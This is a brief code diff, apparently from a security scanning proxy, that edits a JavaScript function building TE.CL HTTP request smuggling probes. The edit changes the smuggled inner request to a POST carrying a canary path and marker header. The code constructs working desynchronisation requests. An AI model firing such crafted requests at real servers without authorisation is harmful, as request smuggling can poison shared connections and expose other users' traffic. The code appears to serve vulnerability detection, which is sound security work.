@@ -60,7 +60,7 @@
     return message("POST", path, parsed.authority, inherited, ["Content-Length: " + body.length].concat(transferLines), body, false) + normalGet(path, parsed, inherited, true);
   }
   function teCl(parsed, path, canaryPath, inherited, marker, transferLines) {
-    var smuggled = "GET " + canaryPath + " HTTP/1.1\r\nHost: " + parsed.authority + "\r\nX-HuntProxy-Desync: " + marker + "\r\nContent-Length: 0\r\n\r\n";
+    var smuggled = "POST " + canaryPath + " HTTP/1.1\r\nHost: " + parsed.authority + "\r\nX-HuntProxy-Desync: " + marker + "\r\nContent-Type: text/plain\r\nContent-Length: 7\r\n\r\n";
     var size = smuggled.length.toString(16), body = size + "\r\n" + smuggled + "\r\n0\r\n\r\n";
     return message("POST", path, parsed.authority, inherited, ["Content-Length: " + (size.length + 2)].concat(transferLines), body, false) + normalGet(path, parsed, inherited, true);
   }
